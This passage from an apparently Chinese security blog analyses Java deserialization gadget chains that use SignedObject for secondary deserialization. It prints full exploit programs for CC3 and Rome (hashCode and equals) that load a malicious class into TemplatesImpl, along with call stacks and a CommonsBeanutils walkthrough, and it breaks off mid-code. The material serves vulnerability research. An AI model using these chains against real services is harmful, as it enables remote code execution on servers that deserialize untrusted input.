java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> SignedObject;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.lang.reflect.*;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchAlgorithmException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException, IllegalAccessException, IOException, SignatureException, InvalidKeyException, NoSuchFieldException &#123;<br><br>        <span class="hljs-comment">//CC3</span><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">tc</span> <span class="hljs-operator">=</span>  templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br>        <span class="hljs-comment">//E:\Java_project\Serialization_Learing\target\classes\Calc.class</span><br>        <span class="hljs-type">byte</span>[][] codes = &#123;code&#125;;<br>        bytecodesField.set(templates, codes);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> tc.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;test&quot;</span>);<br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span>  Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">cls</span>  <span class="hljs-operator">=</span>  c.getDeclaredConstructor(Class.class,Map.class);<br>        cls.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">InvocationHandler</span> <span class="hljs-variable">h</span> <span class="hljs-operator">=</span> (InvocationHandler) cls.newInstance(Override.class,lazyMap);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">maproxy</span> <span class="hljs-operator">=</span> (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Map.class&#125;,h);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> cls.newInstance(Override.class,maproxy);<br><br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>((Serializable) o, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br>        signedObject.getObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>‍</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124111.png" alt="image">​</p><p>那么既然做到了手动触发，那现在的任务就是进行getter方法的调用，那其实思路也很清晰，找能够调用getter方法的链,刚好也总结一下常见调用getter的方法有哪些吧</p><p>‍</p><h3 id="getter触发链分析"><a href="#getter触发链分析" class="headerlink" title="getter触发链分析"></a>getter触发链分析</h3><p>‍</p><h4 id="Rome-HashCode"><a href="#Rome-HashCode" class="headerlink" title="Rome(HashCode)"></a>Rome(HashCode)</h4><p>‍</p><p>利用链</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-string">hashmap#readObject()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">ObjectBean#hashcode()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">EqualsBean#javabeanHashCode()</span> <span class="hljs-string">-&gt;</span> <span class="hljs-string">ToStringBean#toString()-&gt;SignedObject#getObject()</span><br></code></pre></td></tr></table></figure><p>‍</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> SignedObject;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.ObjectBean;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sign_RomeToStringBean</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String fieldname,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;payloads&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap1</span> <span class="hljs-operator">=</span> getpayload(Templates.class, obj);<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(hashMap1, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap2</span> <span class="hljs-operator">=</span> getpayload(SignedObject.class, signedObject);<br><br>        <span class="hljs-comment">//序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(hashMap2);<br>        oos.close();<br><br>        <span class="hljs-comment">//反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> HashMap <span class="hljs-title function_">getpayload</span><span class="hljs-params">(Class clazz, Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">objectBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(ObjectBean.class, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(String.class, <span class="hljs-string">&quot;rand&quot;</span>));<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(objectBean, <span class="hljs-string">&quot;rand&quot;</span>);<br>        <span class="hljs-type">ObjectBean</span> <span class="hljs-variable">expObjectBean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectBean</span>(clazz, obj);<br>        setFieldValue(objectBean, <span class="hljs-string">&quot;_equalsBean&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(ObjectBean.class, expObjectBean));<br>        <span class="hljs-keyword">return</span> hashMap;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>‍</p><p>调用栈为</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java">getObject:<span class="hljs-number">180</span>, SignedObject (java.security)<br>invoke0:-<span class="hljs-number">1</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">62</span>, NativeMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:<span class="hljs-number">498</span>, Method (java.lang.reflect)<br>toString:<span class="hljs-number">137</span>, ToStringBean (com.sun.syndication.feed.impl)<br>toString:<span class="hljs-number">116</span>, ToStringBean (com.sun.syndication.feed.impl)<br>toString:<span class="hljs-number">120</span>, ObjectBean (com.sun.syndication.feed.impl)<br>beanHashCode:<span class="hljs-number">193</span>, EqualsBean (com.sun.syndication.feed.impl)<br>hashCode:<span class="hljs-number">110</span>, ObjectBean (com.sun.syndication.feed.impl)<br>hash:<span class="hljs-number">339</span>, HashMap (java.util)<br>readObject:<span class="hljs-number">1413</span>, HashMap (java.util)<br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><h4 id="Rome-Equals"><a href="#Rome-Equals" class="headerlink" title="Rome(Equals)"></a>Rome(Equals)</h4><p>‍</p><p>利用链</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">Hashtable#readObject() -&gt; EqualsBean#equals() -&gt; EqualsBean.beanEquals() -&gt; SignedObject#getObject()<br></code></pre></td></tr></table></figure><p>‍</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124327.png" alt="image">​</p><p>‍</p><p>‍</p><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> SignedObject;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> com.sun.syndication.feed.impl.EqualsBean;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.security.*;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Sign_RomeEqualsBean</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String fieldname,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldname);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">byte</span>[] payloads = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D:\\Security-Testing\\Java-Sec\\Java-Sec-Payload\\target\\classes\\Evail_Class\\Calc_Ab.class&quot;</span>));<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;payloads&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;a&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">table1</span> <span class="hljs-operator">=</span> getPayload(Templates.class, obj);<br><br>        <span class="hljs-type">KeyPairGenerator</span> <span class="hljs-variable">kpg</span> <span class="hljs-operator">=</span> KeyPairGenerator.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>);<br>        kpg.initialize(<span class="hljs-number">1024</span>);<br>        <span class="hljs-type">KeyPair</span> <span class="hljs-variable">kp</span> <span class="hljs-operator">=</span> kpg.generateKeyPair();<br>        <span class="hljs-type">SignedObject</span> <span class="hljs-variable">signedObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">SignedObject</span>(table1, kp.getPrivate(), Signature.getInstance(<span class="hljs-string">&quot;DSA&quot;</span>));<br><br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">table2</span> <span class="hljs-operator">=</span> getPayload(SignedObject.class, signedObject);<br><br>        <span class="hljs-comment">//序列化</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">baos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(baos);<br>        oos.writeObject(table2);<br>        oos.close();<br>        <span class="hljs-comment">//System.out.println(new String(Base64.getEncoder().encode(baos.toByteArray())));</span><br><br>        <span class="hljs-comment">//反序列化</span><br>        <span class="hljs-type">ByteArrayInputStream</span> <span class="hljs-variable">bais</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(baos.toByteArray());<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(bais);<br>        ois.readObject();<br>        ois.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Hashtable <span class="hljs-title function_">getPayload</span> <span class="hljs-params">(Class clazz, Object payloadObj)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">EqualsBean</span> <span class="hljs-variable">bean</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EqualsBean</span>(String.class, <span class="hljs-string">&quot;r&quot;</span>);<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        map1.put(<span class="hljs-string">&quot;yy&quot;</span>, bean);<br>        map1.put(<span class="hljs-string">&quot;zZ&quot;</span>, payloadObj);<br>        map2.put(<span class="hljs-string">&quot;zZ&quot;</span>, bean);<br>        map2.put(<span class="hljs-string">&quot;yy&quot;</span>, payloadObj);<br>        <span class="hljs-type">Hashtable</span> <span class="hljs-variable">table</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();<br>        table.put(map1, <span class="hljs-string">&quot;1&quot;</span>);<br>        table.put(map2, <span class="hljs-string">&quot;2&quot;</span>);<br>        setFieldValue(bean, <span class="hljs-string">&quot;_beanClass&quot;</span>, clazz);<br>        setFieldValue(bean, <span class="hljs-string">&quot;_obj&quot;</span>, payloadObj);<br>        <span class="hljs-keyword">return</span> table;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>‍</p><p>‍</p><p>调用栈</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs xml">getObject:177, SignedObject (java.security)<br>invoke0:-1, NativeMethodAccessorImpl (sun.reflect)<br>invoke:62, NativeMethodAccessorImpl (sun.reflect)<br>invoke:43, DelegatingMethodAccessorImpl (sun.reflect)<br>invoke:498, Method (java.lang.reflect)<br>beanEquals:146, EqualsBean (com.sun.syndication.feed.impl)<br>equals:103, EqualsBean (com.sun.syndication.feed.impl)<br>equals:495, AbstractMap (java.util)<br>reconstitutionPut:1241, Hashtable (java.util)<br>readObject:1215, Hashtable (java.util)<br></code></pre></td></tr></table></figure><p>‍</p><h4 id="CommonsBeanutils"><a href="#CommonsBeanutils" class="headerlink" title="CommonsBeanutils"></a>CommonsBeanutils</h4><p>‍</p><p>这里也快速分析下CB链调用getter的流程吧</p><p>以下形式来直接动态获取值</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">System.out.println(PropertyUtils.getProperty(student, <span class="hljs-string">&quot;name&quot;</span>));<br></code></pre></td></tr></table></figure><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124497.png" alt="image">​</p><p>这里断点进去看看是如何实现传入<code>name</code>​就调用<code>getName</code>​方法的</p><p>进去后发现会去调用<code>getNestedProperty</code>​</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124686.png" alt="image">​</p><p>跟进后发现他是去判断我们传入的类是什么类型的，如果都不属于下图中类就调用<code>getSimpleProperty</code>​方法</p><p>‍</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124844.png" alt="image">​</p><p>然后也是进去一系列判断如果都不属于这些类就调用<code>getPropertyDescriptor</code>​方法</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124087.png" alt="image">​</p><p>而这个就是重点方法了，这里其实不需要去看他怎么实现的，他会返回<code>PropertyDescriptor类</code>​我们直接看他返回的对象<code>descriptor</code>​即可</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124291.png" alt="image">​</p><p>可以发现他返回了几个属性，恰好就是setter getter方法名字</p><p>再接着往下就是获取方法的名字，然后去调用641行的反射</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124454.png" alt="image">​</p><p>​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202402291124675.png" alt="image">​</p><p>所以到这里我们又可以想象<code>Fastjson</code>​一样，假设谁的 <code>PropertyUtils.getProperty</code>​ 传参是可控的，那么找到一个函数的 getter 是有危险行为的，那么通过CB链就可以去触发导致代码执行(而在Fastjson中也是有这种情况发生，所以后半段恶意类加载就可以利用<code>TemplatesImpl</code>​链来完成)</p><p>我们可以来写一个demo</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> 